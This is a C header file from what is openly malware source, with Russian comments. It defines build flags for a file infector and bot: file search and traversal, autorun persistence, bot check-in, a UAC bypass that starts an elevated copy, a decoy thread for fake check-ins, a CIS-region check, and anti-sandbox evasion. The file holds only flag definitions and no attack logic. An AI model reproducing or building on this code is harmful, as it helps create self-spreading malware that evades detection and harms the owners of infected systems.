#pragma once

#include <Windows.h>
#include <stdio.h>
#include <wchar.h>

#define DEREF_32(name)*(DWORD*)(name)
#define DEREF_16(name)*(WORD*)(name)

#define CAPSID_ALIGNMENT 4096

// При отсутствии данного флага после копирования extended_data в глобальные переменные, капсид перезаписывается с обнуленными флагами
// При наличии не обнуляет флаги при старте.
#define M0YV_USE_PROPFLAG (DWORD)1 
// инфектор не входит в traverse
#define M0YV_FNO_SEARCH (DWORD)2 
// отключает процедуры автозапуска
#define M0YV_FNO_PERSIST (DWORD)4 
// отключает отстук бота при использовании данного флага
#define M0YV_FNO_BOT (DWORD)8 
// использует обход уака для старта еще одной копии с повышенным IL
#define M0YV_USE_UACBYPASS (DWORD)16 
// не возвращает управление из стартап кода, завершая потока через ExitThread
#define M0YV_FNO_RET (DWORD)32 
// использует DECOY поток для фальшивого отстука
#define M0YV_USE_DECOY (DWORD)64
// отключает проверку на CIS - возможность такого флага есть только в дебаг версии
#define DBGM0YV_FNO_CIS_CHECK (DWORD)128
// отключает проверку на песочницу
#define M0YV_FNO_ANTISBX (DWORD)256

// отключает инфектор
#define M0YV_FNO_INFECTOR M0YV_FNO_PERSIST | M0YV_FNO_SEARCH
